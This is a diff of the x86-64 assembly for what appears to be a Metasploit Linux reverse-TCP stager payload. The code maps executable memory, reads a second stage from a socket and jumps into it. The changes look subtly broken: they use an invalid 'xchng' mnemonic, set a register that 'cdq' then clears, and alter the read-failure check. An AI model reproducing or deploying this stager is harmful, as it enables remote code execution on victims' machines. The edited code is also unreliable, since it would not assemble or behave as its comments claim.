@@ -137,6 +137,7 @@ module Payload::Linux::ReverseTcp_x64
         pop    rdi
         test   rax, rax
         jns    connect
+        push   rax
 
       failed:
         push   0x3c
@@ -146,27 +147,28 @@ module Payload::Linux::ReverseTcp_x64
         syscall ; exit(1)
 
       mmap:
-        xor    rdi, rdi  ; pick the address
-        push   0x9       ; mmap offset
+        xor    rdi, rdi  ; system picks the address
+        mov    dh, 0x10  ; length
+        mov    rsi, rdx  ;
+        push   0x22      ; flags
+        pop    r10
+        xor    r9, r9
+        push   0x9       ; mmap syscall offset
         pop    rax
         cdq
-        mov    dh, 0x10
-        mov    rsi, rdx
-        xor    r9, r9
-        push   0x22
-        pop    r10
         mov    dl, 0x7
         syscall ; mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC|0x1000, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0)
         test   rax, rax
         jz failed
-        xchg   rax, rdi
 
       recv:
-        push 0x1000
-        pop    rdx
+        xchng  rsi, rdx
+        xchng  rax, rsi
+        pop    rdi
+        xor    rax, rax
         syscall ; read(3, "", 4096)
         test   rax, rax
-        js     failed
+        jz     failed
 
         jmp    rsi ; to stage
     ^
